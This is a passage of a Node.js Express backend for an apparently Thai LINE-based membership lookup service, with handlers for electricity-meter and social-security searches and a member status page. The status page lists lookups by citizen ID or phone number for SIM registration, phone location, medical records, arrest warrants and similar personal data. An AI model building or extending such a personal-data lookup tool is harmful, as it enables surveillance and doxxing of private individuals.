          searchAtmDatabase(
            keyword
          );


        const message =
          formatAtmSearchResult(
            results,
            keyword
          );


        return res.json({
          ok: true,
          message
        });
      }


      // =====================================
      // PEA : peac%
      // ค้นจากเลข CA
      // =====================================

      if (
        command
          .toLowerCase()
          .startsWith('peac%')
      ) {

        const ca =
          command
            .replace(
              /^peac%/i,
              ''
            )
            .trim();


        if (!ca) {

          return res.json({
            ok: false,
            message:
              'กรุณาระบุเลข CA'
          });
        }


        const data =
          await fetchPEAApi({
            peac: ca
          });


        const flex =
          buildPEANFlex(
            data,
            'ข้อมูลมิเตอร์ไฟฟ้า PEA',
            0
          );


        const message =
          flexToWebText(
            flex
          );


        return res.json({
          ok: true,
          message:
            message ||
            'ไม่พบข้อมูล'
        });
      }


      // =====================================
      // PEA : pean%
      // ค้นจากชื่อ-นามสกุล
      // =====================================

      if (
        command
          .toLowerCase()
          .startsWith('pean%')
      ) {

        const name =
          command
            .replace(
              /^pean%/i,
              ''
            )
            .trim();


        if (!name) {

          return res.json({
            ok: false,
            message:
              'กรุณาระบุชื่อและนามสกุล'
          });
        }


        const data =
          await fetchPEAApi({
            pean: name
          });


        const flex =
          buildPEANFlex(
            data,
            'ข้อมูลมิเตอร์ไฟฟ้าตามชื่อ',
            0,
            name
          );


        const message =
          flexToWebText(
            flex
          );


        return res.json({
          ok: true,
          message:
            message ||
            'ไม่พบข้อมูล'
        });
      }


      // =====================================
      // PEA : peau%
      // ค้นจากที่อยู่
      // =====================================

      if (
        command
          .toLowerCase()
          .startsWith('peau%')
      ) {

        const address =
          command
            .replace(
              /^peau%/i,
              ''
            )
            .trim();


        if (!address) {

          return res.json({
            ok: false,
            message:
              'กรุณาระบุที่อยู่'
          });
        }


        const data =
          await fetchPEAApi({
            peau: address
          });


        const flex =
          buildPEAUFlex(
            data,
            0
          );


        const message =
          flexToWebText(
            flex
          );


        return res.json({
          ok: true,
          message:
            message ||
            'ไม่พบข้อมูล'
        });
      }


      // =====================================
      // PEA : peab%
      // ประวัติการใช้ไฟ
      // =====================================

      if (
        command
          .toLowerCase()
          .startsWith('peab%')
      ) {

        const input =
          command
            .replace(
              /^peab%/i,
              ''
            )
            .trim();


        const parts =
          input
            .split(/\s+/)
            .filter(Boolean);


        const ca =
          parts[0];


        const peano =
          parts[1];


        if (
          !ca ||
          !peano
        ) {

          return res.json({
            ok: false,

            message:
`กรุณาระบุข้อมูลให้ครบ

ตัวอย่าง
123456789012 1234567890`
          });
        }


        const data =
          await fetchPEAApi({
            peab: ca,
            peano
          });


        const message =
          formatPEABillHistory(
            data,
            ca,
            peano
          );


        return res.json({
          ok: true,
          message
        });
      }


      // =====================================
      // PWA (กปภ.) : ตำแหน่งมาตรวัดน้ำ
      // ตำแหน่งมาตรวัดน้ำ : pw%สาขา ชื่อ/ที่อยู่/หมายเลขมาตร
      // =====================================

      if (
        command
          .toLowerCase()
          .startsWith('pw%')
      ) {

        const parts =
          command
            .replace(/^pw%/i, '')
            .trim()
            .split(/\s+/)
            .filter(Boolean);


        const branch =
          parts.shift() || '';


        const value =
          parts.join(' ').trim();


        if (!branch || !value) {

          return res.json({
            ok: false,

            message:
`กรุณาระบุสาขา และข้อมูลที่ต้องการค้นหา

ตัวอย่าง
บ้านบึง นายพิเชษฐ พุฒแก้ว
บ้านบึง 134/2-01
บ้านบึง 134/2 ม.1 ต.ห้างสูง อ.หนองใหญ่ จ.ชลบุรี 20190`
          });
        }


        const mode =
          detectPwaMeterStatMode(value);

        let data = null;
        let usedMode = mode;


        try {

          const result =
            await searchPwaMeterStatWithFallback({
              branch,
              value,
              mode
            });

          data = result.data;
          usedMode = result.mode;

        } catch (err) {

          console.error(
            'WEB PWA METERSTAT ERROR:',
            err?.response?.data || err.message
          );

          return res.json({
            ok: false,

            message:
              err?.response?.data?.message ||
              'ค้นหาข้อมูลมาตรวัดน้ำ (กปภ.) ไม่สำเร็จ'
          });
        }


        if (!data || data.success === false) {

          return res.json({
            ok: false,

            message:
              data?.message ||
              data?.error ||
              'ค้นหาข้อมูลมาตรวัดน้ำ (กปภ.) ไม่สำเร็จ'
          });
        }


        return res.json({
          ok: true,

          message:
            formatPwaMeterStatResult(
              data,
              { branch, value, mode: usedMode }
            )
        });
      }


      // =====================================
      // ยังไม่ได้เปิดคำสั่งนี้
      // =====================================

      return res
        .status(400)
        .json({
          ok: false,
          message:
            'คำสั่งนี้ยังไม่เปิดใช้งานบนหน้าเว็บ'
        });


    } catch (err) {

      console.error(
        'WEB COMMAND ERROR:',
        err?.response?.data ||
        err.message
      );


      return res
        .status(500)
        .json({
          ok: false,

          message:
            'ระบบค้นหาขัดข้อง กรุณาลองใหม่อีกครั้ง'
        });

    }

  }
);

// =====================================
// MEMBER SEARCH : HISTORY PAGE
// =====================================
app.get(
  '/member/search/history',
  (req, res) => {

    const lineUser =
      req.session.lineUser;


    // ยังไม่ได้ Login LINE
    if (!lineUser?.userId) {

      return res.redirect(
        '/line/login?next=%2Fmember%2Fsearch%2Fhistory'
      );

    }


    return res.sendFile(
      path.join(
        __dirname,
        'private_pages',
        'member-search-history.html'
      )
    );

  }
);


// =====================================
// MEMBER SEARCH : HISTORY DATA
// แสดงเฉพาะประวัติของสมาชิกที่ Login อยู่
// =====================================
app.get(
  '/member/search/history/data',
  (req, res) => {

    const lineUser =
      req.session.lineUser;


    if (!lineUser?.userId) {

      return res
        .status(401)
        .json({
          ok: false,
          loginUrl:
            '/line/login?next=%2Fmember%2Fsearch%2Fhistory'
        });

    }


    let logs = [];


    try {

      logs =
        JSON.parse(
          fs.readFileSync(
            SEARCH_LOG_FILE,
            'utf8'
          )
        );

    } catch {

      logs = [];

    }


    // =====================================
    // สำคัญ: เห็นเฉพาะ Log ของตัวเอง
    // =====================================
    const myLogs =
  logs
    .filter(log =>
      String(
        log?.userId || ''
      ) ===
      String(
        lineUser.userId
      )
    )
    .map((log, index) => ({

      id:
        index + 1,

      text:
        String(
          log?.text || '-'
        ),

      source:
        log?.source === 'web'
          ? 'web'
          : 'line',

      time:
        log?.time || null,

      details:
        Array.isArray(
          log?.details
        )
          ? log.details
          : []

    }));

    return res.json({
      ok: true,
      count:
        myLogs.length,
      logs:
        myLogs
    });

  }
);

// =====================================
// MEMBER SEARCH : SI
// =====================================
app.post(
  '/member/search/si',
  express.json(),
  async (req, res) => {

    try {

      const lineUser =
        req.session.lineUser;


      // ==============================
      // ต้อง Login LINE ก่อน
      // ==============================
      if (!lineUser?.userId) {

        return res
          .status(401)
          .json({
            ok: false,
            message:
              'กรุณาเข้าสู่ระบบผ่าน LINE'
          });
      }


      const db =
        loadDB();

      db.members =
        db.members || {};

      db.siBlocked =
        db.siBlocked || {};


      const member =
        db.members[
          lineUser.userId
        ];


      // ==============================
      // ต้องเป็นสมาชิก
      // ==============================
      if (!member) {

        return res
          .status(403)
          .json({
            ok: false,
            message:
              'ไม่พบข้อมูลสมาชิก'
          });
      }


      // ==============================
      // ต้องอนุมัติแล้ว
      // ==============================
      if (
        member.status !==
        'approved'
      ) {

        return res
          .status(403)
          .json({
            ok: false,
            message:
              'บัญชีสมาชิกยังไม่พร้อมใช้งาน'
          });
      }


      // ==============================
      // ตรวจวันหมดอายุ
      // ==============================
      if (member.expireAt) {

        const expireDate =
          new Date(
            member.expireAt
          );


        if (
          !Number.isNaN(
            expireDate.getTime()
          ) &&
          expireDate.getTime() <
            Date.now()
        ) {

          return res
            .status(403)
            .json({
              ok: false,
              message:
                'สิทธิ์สมาชิกหมดอายุแล้ว'
            });
        }
      }


      const phone =
        String(
          member.phone ||
          member.tel ||
          member.mobile ||
          ''
        )
          .replace(/\D/g, '');


      // ==============================
      // ตรวจระงับ SI
      // ==============================
      if (
        db.siBlocked?.[
          phone
        ] === true
      ) {

        return res.json({
          ok: false,
          blocked: true,
          message:
`ระบบทำการปรับปรุง⚠️
ขออภัยในความไม่สะดวก`
        });
      }


      // ==============================
      // ตรวจ Input
      // ==============================
      const citizenId =
        String(
          req.body?.citizenId ||
          ''
        )
          .replace(/\D/g, '');


      if (
        !/^\d{13}$/.test(
          citizenId
        )
      ) {

        return res
          .status(400)
          .json({
            ok: false,
            message:
              'กรุณาระบุเลขบัตรประชาชน 13 หลัก'
          });
      }


      // =====================================
      // จุดเชื่อมระบบ SI ที่ได้รับอนุญาต
      // =====================================
      //
      // ให้ฟังก์ชันภายในของคุณคืนค่าในรูป:
      //
      // [
      //   {
      //     companyName: 'บริษัท...',
      //     branchCode: '0001',
      //     accountNo: '...',
      //     startDate: '...',
      //     resignDate: '...',
      //     status: '...'
      //   }
      // ]
      //
      // ตอนนี้ยังไม่ยิงแหล่งข้อมูลภายนอก
      // =====================================

      const siResponse =
  await queryAuthorizedSiData({
    citizenId,
    requesterUserId:
      lineUser.userId,
    requesterPhone:
      phone
  });


if (!siResponse?.success) {

  return res
    .status(502)
    .json({
      ok: false,
      message:
        siResponse?.message ||
        'ไม่สามารถดึงข้อมูลประกันสังคมได้'
    });
}


const content =
  Array.isArray(
    siResponse?.data?.content
  )
    ? siResponse.data.content
    : [];


const results =
  content.map(item => ({

    companyName:
      item.companyName ||
      '-',

    branchCode:
      item.accBran ||
      item.branchCode ||
      '-',

    accountNo:
      item.accNo ||
      item.accountNo ||
      '-',

    startDate:
      item.expStartDateText ||
      '-',

    resignDate:
      item.empResignDateText ||
      '-',

    status:
      item.employStatusDesc ||
      '-'

  }));


      // Log เฉพาะท้าย 4 หลัก
      console.log(
        'WEB SI SEARCH:',
        {
          userId:
            lineUser.userId,

          phone,

          citizenIdMasked:
            '*********' +
            citizenId.slice(-4)
        }
      );

// =====================================
// บันทึกประวัติการค้นหาจาก WEB
// =====================================
saveSearchLog(
  lineUser.userId,

  lineUser.displayName ||
  member.lineName ||
  member.displayName ||
  '-',

  `si%${citizenId}`,

  'web',

  results.map(item => ({

    branchCode:
      item.branchCode ||
      '-',

    startDate:
      item.startDate ||
      '-',

    resignDate:
      item.resignDate ||
      '-',

    status:
      item.status ||
      '-'

  }))
);

      return res.json({
        ok: true,
        count:
          results.length,
        results
      });


    } catch (err) {

  console.error(
    'WEB SI SEARCH ERROR:',
    {
      message:
        err?.message,

      status:
        err?.response?.status,

      response:
        err?.response?.data,

      code:
        err?.code
    }
  );


  return res
    .status(500)
    .json({
      ok: false,

      message:
        err?.response?.data?.message ||
        err?.message ||
        'ระบบค้นหาขัดข้อง กรุณาลองใหม่อีกครั้ง'
    });
}
  }
);

// ==============================
// MEMBER STATUS PAGE
// ==============================
app.get('/member/status', (req, res) => {
  const lineUser = req.session.lineUser;

  // ยังไม่ได้ Login LINE
  if (!lineUser?.userId) {
    return res.redirect(
      '/line/login?next=%2Fmember%2Fstatus'
    );
  }

  // โหลดฐานข้อมูลสมาชิก
  const db = loadDB();

  db.members = db.members || {};

  const member = db.members[lineUser.userId];

  // ป้องกัน HTML Injection
  const escapeHtml = (value = '') =>
    String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');

  // ==============================
  // ไม่พบสมาชิก
  // ==============================
  if (!member) {
    return res.send(`
<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>สถานะสมาชิก</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  background: #070b11;
  color: #ffffff;
  font-family: Arial, Tahoma, sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.card {
  width: 100%;
  max-width: 500px;
  background: #10161f;
  border: 1px solid #293747;
  border-radius: 20px;
  padding: 35px 25px;
  text-align: center;
}

.icon {
  font-size: 48px;
  margin-bottom: 15px;
}

.text {
  color: #94a3b8;
  line-height: 1.7;
}

.btn {
  display: block;
  margin-top: 22px;
  padding: 14px;
  background: #d7b56d;
  color: #111111;
  text-decoration: none;
  border-radius: 10px;
  font-weight: bold;
}
</style>
</head>

<body>

<div class="card">

  <div class="icon">👤</div>

  <h2>ไม่พบข้อมูลสมาชิก</h2>

  <div class="text">
    บัญชี LINE นี้ยังไม่ได้ลงทะเบียนสมาชิก
  </div>

  <a class="btn" href="/register">
    สมัครสมาชิก
  </a>

</div>

</body>
</html>
    `);
  }

  // ==============================
  // ตรวจสอบวันหมดอายุ
  // ==============================
  const now = new Date();

  const expireDate =
    member.expireAt
      ? new Date(member.expireAt)
      : null;

  const hasExpireDate =
    expireDate &&
    !Number.isNaN(expireDate.getTime());

  let daysLeft = null;

  if (hasExpireDate) {
    const diff =
      expireDate.getTime() - now.getTime();

    daysLeft = Math.max(
      0,
      Math.ceil(
        diff / (1000 * 60 * 60 * 24)
      )
    );
  }

  // ==============================
  // สถานะสมาชิก
  // ==============================
  const memberStatus =
    String(member.status || '')
      .trim()
      .toLowerCase();

  const expired =
    memberStatus === 'approved' &&
    hasExpireDate &&
    expireDate.getTime() <= now.getTime();

  let statusText = 'รอการตรวจสอบ';
  let statusClass = 'pending';
  let statusIcon = '🟡';

  if (memberStatus === 'approved') {
    if (expired) {
      statusText = 'หมดอายุ';
      statusClass = 'expired';
      statusIcon = '🔴';
    } else {
      statusText = 'ใช้งานได้';
      statusClass = 'active';
      statusIcon = '✅';
    }
  } else if (memberStatus === 'pending') {
    statusText = 'รอการอนุมัติ';
    statusClass = 'pending';
    statusIcon = '🟡';
  } else if (memberStatus === 'rejected') {
    statusText = 'ไม่ผ่านการอนุมัติ';
    statusClass = 'expired';
    statusIcon = '❌';
  }

  const canUseSystem =
    memberStatus === 'approved' &&
    !expired;
    
// ==============================
// เบอร์สมาชิกสำหรับตรวจสิทธิ์พิเศษ
// ==============================
const phone =
  String(member.phone || '')
    .replace(/\D/g, '');


// ==============================
// สิทธิ์พิเศษ
// เฉพาะ 3 คำสั่งนี้ต้องแอดมินเปิดเพิ่ม
// ==============================
const specialPermissions = {

  'a#':
    db.aisPermissions?.[phone] === true,

  'fx#':
    db.fxPermissions?.[phone] === true,

  // h# เดี๋ยวใส่ permission map จริงของคุณ
  'h#':
    false
};


// ==============================
// รายการคำสั่งทั้งหมด
// ==============================
const searchSections = [

  {
    title: '📶 จดทะเบียนเบอร์โทร',

    items: [
      {
        command: "a@",
        text: "a@เบอร์โทร/เลขบัตร → จดทะเบียน AIS",
        special: true
      },
      {
        command: "d@",
        text: "d@เบอร์โทร/เลขบัตร → จดทะเบียน DTAC"
      },
      {
        command: "t@",
        text: "t@เบอร์โทร/เลขบัตร/ชื่อ สกุล → จดทะเบียน True"
      },
      {
        command: "tid@",
        text: "tid@เลขบัตร → True Online / True Fiber"
      },
      {
        command: "tv@",
        text: "tv@เลขกล่อง → จุดติดตั้ง"
      }
    ]
  },


  {
    title: '📱 ข้อมูลเครือข่าย',

    items: [
      {
        command: "on@",
        text: "on@66xxxxxxxxx → เช็คปิด/เปิดเครื่อง"
      },
      {
        info: true,
        text: "ตัวอย่าง: on@66812345678"
      },
      {
        command: "net@",
        text: "net@เบอร์โทร → ตรวจเครือข่ายเบอร์"
      }
    ]
  },


  {
    title: '📦 พัสดุและการจัดส่ง',

    items: [
      {
        command: "fx@",
        text: "fx@เบอร์โทร/ชื่อสกุล → พัสดุละเอียด",
        special: true
      },
      {
        command: "f@",
        text: "f@เบอร์โทร → ตรวจพัสดุ"
      },
      {
        command: "tic@",
        text: "tic@เลขพัสดุ → ตรวจภาพรับพัสดุ"
      }
    ]
  },


  {
    title: '🏦 Bank / Cell',

    items: [
      {
        command: "bn@",
        text: "bn@ชื่อธนาคาร/รหัสสาขา → ค้นหาข้อมูลธนาคาร"
      },
      {
        command: "atm@",
        text: "atm@รหัสตู้ → ตรวจสอบจุดติดตั้ง ATM"
      },
      {
        command: "b@",
        text: "b@mcc/mnc/lac/cid → ตรวจพิกัดเสา Base"
      }
    ]
  },


  {
    title: '🏥 การรักษาและสถานพยาบาล',

    items: [
      {
        command: "h@",
        text: "h@เลขบัตร → ตรวจข้อมูลการรักษา",
        special: true
      },
      {
        command: "nm@",
        text: "nm@รหัสหน่วยบริการ/ชื่อสถานพยาบาล → ค้นหาสถานพยาบาล"
      },
      {
        command: "dc@",
        text: "dc@ชื่อ สกุล → ตรวจแพทย์"
      },
      {
        command: "dr@",
        text: "dr@ชื่อ สกุล → ตรวจแพทย์/บุคลากรสาธารณสุข"
      }
    ]
  },


  {
    title: '🏛️ ประกันสังคมและสวัสดิการ',

    items: [
      {
        command: "si@",
        text: "si@เลขบัตร → ตรวจประกันสังคม"
      },
      {
        command: "wf@",
        text: "wf@เลขบัตร → ตรวจเบี้ยยังชีพ"
      },
      {
        command: "kp@",
        text: "kp@เลขบัตร/เลขสมาชิก → ตรวจสมาชิก สก.ทบ."
      }
    ]
  },


  {
    title: '⚖️ กฎหมาย / คดี / หมายจับ',

    items: [
      { command: "dl@", text: "dl@เลขบัตร → ตรวจใบขับขี่" },
      { command: "pb@", text: "pb@เลขบัตร → ตรวจคุมประพฤติ" },
      { command: "nb@", text: "nb@เลขบัตร → ตรวจประวัติคดียาเสพติด" },
      { command: "psi@", text: "psi@เลขบัตร → ตรวจผู้ต้องขัง" },
      { command: "ps@", text: "ps@เลขบัตร → ตรวจผู้ต้องขังยังไม่พิพากษา" },
      { command: "c@", text: "c@เลขบัตร → ตรวจหมายจับ CRIME" },
      { command: "doc@", text: "doc@เลขบัตร → ตรวจหมายจับศาล" },
      { command: "lw@", text: "lw@คำถาม → ค้นหาข้อกฎหมาย" }
    ]
  },


  {
    title: '🏢 บริษัท / ใบอนุญาต',

    items: [
      { command: "dbd@", text: "dbd@เลขนิติบุคคล → ตรวจข้อมูลจดทะเบียนนิติบุคคล" },
      { command: "lc@", text: "lc@ชื่อ-สกุล,ชื่อบริษัท → ตรวจใบอนุญาตบริษัท" },
      { command: "for@", text: "for@เลขนิติบุคคล → ตรวจทะเบียนพาณิชย์/นิติบุคคล" },
      { command: "tr@", text: "tr@ชื่อผู้ประกอบการ → ตรวจผู้ประกอบการขนส่ง" },
      { command: "tisi@", text: "tisi@เลข มอก. → ตรวจมาตรฐาน มอก." }
    ]
  },


  {
    title: '🚘 ยานพาหนะ',

    items: [
      { command: "cid@", text: "cid@เลขบัตร → ตรวจรถจากเลขบัตร" },
      { command: "car@", text: "car@จังหวัด หมวด ตัวเลข ประเภทรถ → ตรวจสอบจากทะเบียน" },
      { info: true, text: "ตัวอย่าง: car@กรุงเทพ 1กก 334 1" },
      { command: "pt@", text: "pt@ → อ่านป้ายทะเบียนและวิเคราะห์รถ" },
      { info: true, text: 'หมายเหตุ: รอระบบแจ้งให้ส่งภาพ' },
      { command: "tro@", text: "tro@หมวดอักษร หมวดตัวเลข จังหวัด → ตรวจสอบเข้า ตรอ." },
      { info: true, text: "ตัวอย่าง: tro@1กก 334 กรุงเทพ" },
      { command: "bq@", text: "bq@เบอร์โทร/เลขบัตร → ตรวจสอบศูนย์บริการรถ" }
    ]
  },


  {
    title: '👤 เปรียบเทียบใบหน้า',

    items: [
      { command: "ff@", text: "ff@ → เปรียบเทียบใบหน้า" },
      { info: true, text: 'หมายเหตุ: รอระบบแจ้งให้ส่งภาพ' }
    ]
  },


  {
    title: '⚡ ไฟฟ้านครหลวง',

    items: [
      { command: "mea@", text: "mea@ชื่อ สกุล → ตรวจสอบข้อมูลไฟฟ้า MEA" },
      { command: "kru@", text: "kru@เลขมิเตอร์ → ตรวจสอบมิเตอร์" }
    ]
  },


  {
    title: '⚡ ไฟฟ้าภูมิภาค',

    items: [
      { command: "peac@", text: "peac@เลข CA → ค้นหาจาก CA" },
      { command: "pean@", text: "pean@ชื่อ สกุล → ค้นหาชื่อ-สกุล" },
      { command: "peau@", text: "peau@ที่อยู่ → ค้นหาที่อยู่" },
      { command: "peab@", text: "peab@เลข CA เลขมิเตอร์ → ประวัติการใช้" }
    ]
  },


  {
    title: '🚰 ประปา',

    items: [
      { command: "pw@", text: "pw@สาขา ชื่อ/ที่อยู่/หมายเลขมาตร → ตำแหน่ง ข้อมูลเบอร์โทร" },
      { info: true, text: "ตัวอย่าง: pw@บ้านบึง นายพิเชษฐ พุฒแก้ว" }
    ]
  },


  {
    title: '🌐 ออนไลน์',

    items: [
      { command: "phis@", text: "phis@URL → เพิ่ม Phishing" },
      { command: "chphis@", text: "chphis@ID → ตรวจผล Phishing" },
      { command: "picf@", text: "picf@URL → ดึงภาพ Profile Facebook" },
      { command: "soc@", text: "soc@Username/ชื่อโซเชียล → ค้นหาโซเชียล" },
      { command: "web@", text: "web@ชื่อเว็บไซต์ → ตรวจเว็บไซต์" },
      { command: "loa@", text: "loa@ชื่อแอป → ตรวจแอปเงินกู้" }
    ]
  },


  {
    title: '📡 ข้อมูลเครือข่ายและอุปกรณ์',

    items: [
      { command: "ip@", text: "ip@เลข IP → ตรวจสอบเครือข่าย IP" },
      { command: "imei@", text: "imei@เลข IMEI → ตรวจสอบ IMEI" },
      { command: "imsi@", text: "imsi@เลข IMSI → ตรวจสอบ IMSI" },
      { command: "icc@", text: "icc@เลข ICCID → ตรวจสอบเลขซิม" }
    ]
  },


  {
    title: '🗺️ แผนที่ระยะทาง',

    items: [
      { command: "dis@", text: "dis@พิกัดต้นทาง/พิกัดปลายทาง → คำนวณระยะทาง" },
      { command: "map@", text: "map@ละติจูด,ลองจิจูด → ตรวจสอบพิกัด MAP" }
    ]
  },


  {
    title: '📹 เครื่องมืออื่น ๆ',

    items: [
      { command: "cj@", text: "cj@เบอร์โทร เลขบัตร → ตรวจสอบสมาชิก CJ" },
      { command: "se@", text: "se@รหัสสาขา 7-11 → ตรวจสอบสาขาเซเว่น" },
      { command: "sc@", text: "sc@เลขบัตร → ตรวจสอบประวัติการผ่อนสินค้า" },
      { command: "cctv@", text: "cctv@เวลากล้อง,เวลาจริง → เปรียบเทียบเวลากล้อง" }
    ]
  }

];


// ==============================
// สร้าง HTML สิทธิ์คำสั่ง
// ==============================
const searchPermissionHtml =
  searchSections
    .flatMap(section => section.items)
    .filter(item => !item.info)
    .map(item => {

      // =============================
      // ตรวจสิทธิ์เดิม
      // =============================
      let allowed = false;

      if (item.special) {

        allowed =
          canUseSystem &&
          specialPermissions[normalizeNectSearchCommand(item.command)] === true;

      } else {

        allowed = canUseSystem;

      }


      // =============================
      // เอาเฉพาะชื่อรายการ
      // ไม่แสดง command เช่น a#, d#, si%
      // =============================
      const rawText =
        String(item.text || '').trim();

      const arrowParts =
        rawText.split('→');

      const description =
        arrowParts.length > 1
          ? arrowParts
              .slice(1)
              .join('→')
              .trim()
          : rawText;


      // =============================
      // เก็บ emoji ด้านหน้าไว้
      // เช่น 📗 📘 📙
      // =============================
      const emojiMatch =
        rawText.match(
          /[\p{Extended_Pictographic}]\uFE0F?/u
        );

      const icon =
        emojiMatch
          ? emojiMatch[0] + ' '
          : '';


      const displayText =
        icon + description;


      // =============================
      // สถานะสิทธิ์
      // =============================
      const permissionText =
        allowed
          ? '✅ ใช้งานได้'
          : '🔒 ยังไม่มีสิทธิ์';


      return `
        <div
          class="search-command"
          style="
            display:block;
            padding:14px 0;
          "
        >

          <div
            class="search-text"
            style="
              font-size:15px;
              line-height:1.6;
              color:#CBD5E1;
            "
          >
            ${escapeHtml(displayText)}
          </div>

          <div
            class="search-allowed"
            style="
              margin-top:5px;
              font-size:13px;
              font-weight:600;
            "
          >
            ${permissionText}
          </div>

        </div>
      `;

    })
    .join('');

  // ==============================
  // ชื่อสมาชิก
  // ==============================
  const memberName =
    [
      member.rank,
      member.fullname || member.fullName
    ]
      .filter(Boolean)
      .join(' ') ||
    lineUser.displayName ||
    '-';

  // ==============================
  // รูป LINE
  // ==============================
  const pictureUrl =
    lineUser.pictureUrl
      ? escapeHtml(lineUser.pictureUrl)
      : '';

  // ==============================
  // วันหมดอายุแบบไทย
  // ==============================
  const expireText =
    hasExpireDate
      ? expireDate.toLocaleDateString(
          'th-TH',
          {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
          }
        )
      : '-';

  return res.send(`
<!DOCTYPE html>
<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>สถานะสมาชิก</title>

<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  background: #070b11;
  color: #e5e7eb;
  font-family: Arial, Tahoma, sans-serif;
}

.page {
  padding: 20px;
}

.container {
  width: 100%;
  max-width: 620px;
  margin: 20px auto;
  background: #10161f;
  border: 1px solid #293747;
  border-radius: 22px;
  padding: 24px;
}

.title {
  color: #ffffff;
  font-size: 19px;
  font-weight: bold;
  margin-bottom: 18px;
}

.profile {
  display: flex;
  align-items: center;
  gap: 15px;
  padding: 17px;
  background: #080d13;
  border: 1px solid #293747;
  border-radius: 15px;
}

.avatar {
  width: 60px;
  height: 60px;
  border-radius: 50%;
  object-fit: cover;
  background: #1e293b;
}

.profile-label {
  color: #94a3b8;
  font-size: 11px;
}

.profile-name {
  margin-top: 4px;
  color: #ffffff;
  font-size: 17px;
  font-weight: bold;
}

.uid {
  margin-top: 5px;
  color: #64748b;
  font-size: 10px;
  word-break: break-all;
}

.divider {
  margin: 24px 0;
  border: 0;
  border-top: 1px solid #293441;
}

.section-title {
  color: #ffffff;
  font-size: 15px;
  font-weight: bold;
  margin-bottom: 14px;
}

.status-box {
  padding: 18px;
  background: #080d13;
  border: 1px solid #293747;
  border-radius: 15px;
}

.row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 15px;
  padding: 10px 0;
}

.label {
  color: #94a3b8;
  font-size: 12px;
}

.value {
  color: #ffffff;
  font-size: 13px;
  font-weight: bold;
  text-align: right;
}

.active {
  color: #86efac;
}

.pending {
  color: #facc15;
}

.expired {
  color: #f87171;
}

.days {
  color: #d7b56d;
  font-size: 26px;
  font-weight: bold;
}

.ok {
  color: #86efac;
}

.no {
  color: #f87171;
}

.note {
  margin-top: 20px;
  color: #64748b;
  text-align: center;
  font-size: 11px;
}

.search-header {
  margin-top: 5px;
  margin-bottom: 22px;
  color: #ffffff;
  font-size: 18px;
  font-weight: bold;
}

.search-section {
  margin-bottom: 28px;
}

.search-title {
  margin-bottom: 12px;
  color: #ffffff;
  font-size: 15px;
  font-weight: bold;
}

.search-command {
  padding: 12px 0;
  border-bottom: 1px solid #1f2937;
}

.search-text {
  color: #cbd5e1;
  font-size: 12px;
  line-height: 1.7;
  word-break: break-word;
}

.search-allowed {
  margin-top: 5px;
  margin-left: 18px;
  color: #86efac;
  font-size: 11px;
  font-weight: bold;
}

.search-locked {
  margin-top: 5px;
  margin-left: 18px;
  color: #fbbf24;
  font-size: 11px;
  font-weight: bold;
}

.search-info {
  padding: 7px 0 7px 18px;
  color: #64748b;
  font-size: 11px;
  line-height: 1.6;
}

</style>

</head>

<body>

<div class="page">

<div class="container">

  <div class="title">
    👤 สถานะสมาชิก
  </div>

  <div class="profile">

    ${
      pictureUrl
        ? `
          <img
            class="avatar"
            src="${pictureUrl}"
            alt="LINE Profile"
          >
        `
        : `
          <div class="avatar"></div>
        `
    }

    <div>

      <div class="profile-label">
        บัญชี LINE
      </div>

      <div class="profile-name">
        ${escapeHtml(
          member.lineName ||
          lineUser.displayName ||
          '-'
        )}
      </div>

      <div class="uid">
        UID : ${escapeHtml(lineUser.userId)}
      </div>

    </div>

  </div>

  <hr class="divider">

  <div class="section-title">
    📅 สถานะการใช้งาน
  </div>

  <div class="status-box">

    <div class="row">
      <div class="label">สถานะ</div>

      <div class="value ${statusClass}">
        ${statusIcon} ${statusText}
      </div>
    </div>

    <div class="row">
      <div class="label">ชื่อสมาชิก</div>

      <div class="value">
        ${escapeHtml(memberName)}
      </div>
    </div>

    <div class="row">
      <div class="label">หมายเลขโทรศัพท์</div>

      <div class="value">
        ${escapeHtml(member.phone || '-')}
      </div>
    </div>

    <div class="row">
      <div class="label">วันที่อนุมัติ</div>

      <div class="value">
        ${escapeHtml(member.approvedAt || '-')}
      </div>
    </div>

    <div class="row">
      <div class="label">ระยะเวลาที่ได้รับ</div>

      <div class="value">
        ${
          member.approvedDays
            ? `${Number(member.approvedDays)} วัน`
            : '-'
        }
      </div>
    </div>

    <div class="row">
      <div class="label">วันหมดอายุ</div>

      <div class="value">
        ${escapeHtml(expireText)}
      </div>
    </div>

    <div class="row">
      <div class="label">วันใช้งานคงเหลือ</div>

      <div class="days">
        ${
          memberStatus !== 'approved'
            ? '-'
            : `${daysLeft ?? 0} วัน`
        }
      </div>
    </div>

    <div class="row">
      <div class="label">สิทธิ์ใช้งานระบบ</div>

      <div class="value ${
        canUseSystem ? 'ok' : 'no'
      }">

        ${
          canUseSystem
            ? '✅ ใช้งานได้'
            : '❌ ไม่สามารถใช้งานได้'
        }

      </div>
    </div>

  </div>

<hr class="divider">

<div class="search-header">
  🔎 สิทธิสืบค้นข้อมูล
</div>

${searchPermissionHtml}

  <div class="note">
    ข้อมูลสถานะอ้างอิงจากสิทธิ์สมาชิกในระบบ
  </div>

</div>

</div>

</body>

</html>
  `);
});

// =====================================
// SIGNAL REQUEST PAGE
// =====================================
app.get('/signal/request', (req, res) => {

  const lineUser = req.session.lineUser;

  // =====================================
  // ยังไม่ได้ Login LINE
  // =====================================
  if (!lineUser?.userId) {
    return res.redirect(
      '/line/login?next=%2Fsignal%2Frequest'
    );
  }


  // =====================================
  // โหลดฐานข้อมูล
  // =====================================
  const db = loadDB();

  db.members =
    db.members || {};

  db.remoteSignalPermissions =
    db.remoteSignalPermissions || {};


  const member =
    db.members[lineUser.userId];


  // =====================================
  // ป้องกัน HTML Injection
  // =====================================
  const escapeHtml = (value = '') =>
    String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
